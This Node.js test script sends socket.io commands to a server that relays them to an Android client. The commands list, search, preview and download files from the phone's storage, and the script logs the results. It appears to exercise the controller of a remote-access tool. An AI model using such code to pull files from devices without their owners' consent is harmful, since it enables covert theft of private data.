const io = require('socket.io-client');

const SERVER_URL = 'http://192.168.1.101:9400';

console.log('🔌 Connecting to server...');

const socket = io(SERVER_URL, {
    transports: ['polling', 'websocket']
});

let testStep = 0;
const tests = [
    {
        name: "📁 List Root Directory",
        command: { type: '0xFI', action: 'ls' }
    },
    {
        name: "📁 List External Storage",
        command: { type: '0xFI', action: 'ls', path: '/storage/emulated/0' }
    },
    {
        name: "🔍 Search Files",
        command: { type: '0xFI', action: 'search', query: 'test' }
    },
    {
        name: "📄 Preview Text File",
        command: { type: '0xFI', action: 'preview', path: '/storage/emulated/0/Download/test.txt' }
    },
    {
        name: "📥 Download File",
        command: { type: '0xFI', action: 'download', path: '/storage/emulated/0/Download/test.txt' }
    }
];

socket.on('connect', () => {
    console.log('✅ Connected to server');
    runNextTest();
});

function runNextTest() {
    if (testStep >= tests.length) {
        console.log('🎉 All tests completed!');
        process.exit(0);
    }
    
    const test = tests[testStep];
    console.log(`\n🧪 Test ${testStep + 1}/${tests.length}: ${test.name}`);
    console.log('📤 Sending command...');
    
    socket.emit('send_command', {
        clientID: 'android_1758309836329_rl5633k45', // Replace with actual client ID
        command: test.command
    });
    
    testStep++;
    
    // Wait for response before next test
    setTimeout(() => {
        runNextTest();
    }, 3000);
}

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

socket.on('connect_error', (error) => {
    console.log('❌ Connection error:', error.message);
    process.exit(1);
});

// Listen for file responses
socket.on('0xFI', (data) => {
    console.log('📁 File Manager Response:');
    console.log('Type:', data.type);
    
    switch (data.type) {
        case 'list':
            console.log('📂 Directory:', data.currentPath);
            console.log('📊 Count:', data.count);
            console.log('Status:', data.status);
            if (data.list && data.list.length > 0) {
                console.log('📋 Files:');
                data.list.slice(0, 5).forEach((file, index) => {
                    const icon = file.displayName ? file.displayName.split(' ')[0] : '📄';
                    console.log(`  ${index + 1}. ${icon} ${file.name} (${file.sizeFormatted}) - ${file.type}`);
                });
                if (data.list.length > 5) {
                    console.log(`  ... and ${data.list.length - 5} more items`);
                }
            }
            break;
            
        case 'search':
            console.log('🔍 Search Query:', data.query);
            console.log('📊 Results:', data.count);
            if (data.results && data.results.length > 0) {
                console.log('📋 Search Results:');
                data.results.slice(0, 3).forEach((file, index) => {
                    console.log(`  ${index + 1}. ${file.name} (${file.path})`);
                });
            }
            break;
            
        case 'preview':
            console.log('📄 File:', data.fileName);
            console.log('📊 Size:', data.fileSizeFormatted);
            console.log('📝 Type:', data.fileType);
            console.log('🔍 Is Text:', data.isText);
            if (data.content) {
                console.log('📖 Content Preview:');
                console.log('   ' + data.content.substring(0, 200) + (data.content.length > 200 ? '...' : ''));
            }
            break;
            
        case 'download':
            console.log('📥 Downloaded:', data.fileName);
            console.log('📊 Size:', data.fileSizeFormatted);
            console.log('📝 Type:', data.fileType);
            console.log('💾 Buffer Length:', data.buffer ? data.buffer.length : 'No buffer');
            break;
            
        case 'delete':
            console.log('🗑️ Deleted:', data.path);
            console.log('Status:', data.status);
            break;
            
        case 'create_folder':
            console.log('📁 Created Folder:', data.name);
            console.log('📍 Path:', data.path);
            console.log('Status:', data.status);
            break;
            
        case 'error':
            console.log('❌ Error:', data.error);
            break;
            
        default:
            console.log('📋 Data:', JSON.stringify(data, null, 2));
    }
});
